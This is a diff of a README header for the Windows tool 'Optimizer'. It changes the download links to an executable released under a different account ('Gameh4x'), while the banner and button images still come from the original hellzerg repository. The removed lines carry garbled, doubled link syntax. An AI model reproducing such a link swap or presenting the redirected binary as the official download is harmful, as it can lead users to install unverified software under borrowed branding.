@@ -1,10 +1,10 @@
 <p align="center">
-	<a href="[https://github.com/hellzerg/optimizer/releases/download/16.6/Optimizer-16.6.exe](https://github.com/Gameh4x/Optimizer/releases/download/16.7/Optimizer-16.7.exe)" target="_blank">
+	<a href="https://github.com/Gameh4x/Optimizer/releases/download/16.7/Optimizer-16.7.exe" target="_blank">
    		<img src="https://raw.githubusercontent.com/hellzerg/optimizer/master/banner.png">
 </p>
 
 <p align="center">
-	<a href="[https://github.com/hellzerg/optimizer/releases/download/16.6/Optimizer-16.6.exe](https://github.com/Gameh4x/Optimizer/releases/download/16.7/Optimizer-16.7.exe)" target="_blank">
+	<a href="https://github.com/Gameh4x/Optimizer/releases/download/16.7/Optimizer-16.7.exe" target="_blank">
 		<img src="https://raw.githubusercontent.com/hellzerg/optimizer/master/download-button.png">
 		<br>
 		<img src="https://raw.githubusercontent.com/hellzerg/optimizer/master/flags.png">
